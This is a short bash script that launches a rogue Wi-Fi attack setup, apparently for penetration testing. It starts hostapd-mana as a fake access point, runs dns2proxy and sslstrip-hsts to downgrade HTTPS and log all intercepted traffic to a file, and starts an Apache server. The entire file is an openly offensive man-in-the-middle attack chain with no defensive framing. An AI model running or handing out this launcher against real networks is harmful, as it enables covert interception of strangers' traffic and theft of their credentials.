#!/bin/bash

echo "[+] Starting mana toolkit..."

xterm -hold -e "hostapd-mana/hostapd hostapd-mana/hostapd.conf" &
xterm -hold -e "python3 sslstrip-hsts/dns2proxy/dns2proxy.py" &
xterm -hold -e "python3 sslstrip-hsts/sslstrip.py -l 10000 -w sslstrip.log -a" &
service apache2 start

echo "[+] All services launched."
